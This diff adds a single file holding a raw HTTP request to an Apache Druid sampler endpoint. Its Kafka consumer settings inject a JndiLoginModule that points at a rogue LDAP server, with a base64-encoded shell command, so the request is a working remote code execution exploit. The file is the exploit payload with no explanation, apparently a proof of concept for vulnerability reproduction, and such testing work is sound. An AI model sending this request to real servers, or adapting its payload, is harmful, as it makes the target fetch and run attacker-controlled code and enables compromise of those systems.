@@ -1,0 +1,56 @@
+POST /druid/indexer/v1/sampler?for=connect HTTP/1.1
+Host: 10.10.3.128
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Content-Type: application/json
+Content-Length: 1452
+
+{
+    "type":"kafka",
+    "spec":{
+        "type":"kafka",
+        "ioConfig":{
+            "type":"kafka",
+            "consumerProperties":{
+                "bootstrap.servers":"127.0.0.1:6666",
+                "sasl.mechanism":"SCRAM-SHA-256",
+                "security.protocol":"SASL_SSL",
+                "sasl.jaas.config":"com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"ldap://roguo-jndi-server:1389/Basic/Command/base64/aWQgPiAvdG1wL3N1Y2Nlc3M=\" useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" group.provider.url=\"xxx\";"
+            },
+            "topic":"test",
+            "useEarliestOffset":true,
+            "inputFormat":{
+                "type":"regex",
+                "pattern":"([\\s\\S]*)",
+                "listDelimiter":"56616469-6de2-9da4-efb8-8f416e6e6965",
+                "columns":[
+                    "raw"
+                ]
+            }
+        },
+        "dataSchema":{
+            "dataSource":"sample",
+            "timestampSpec":{
+                "column":"!!!_no_such_column_!!!",
+                "missingValue":"1970-01-01T00:00:00Z"
+            },
+            "dimensionsSpec":{
+
+            },
+            "granularitySpec":{
+                "rollup":false
+            }
+        },
+        "tuningConfig":{
+            "type":"kafka"
+        }
+    },
+    "samplerConfig":{
+        "numRows":500,
+        "timeoutMs":15000
+    }
+}
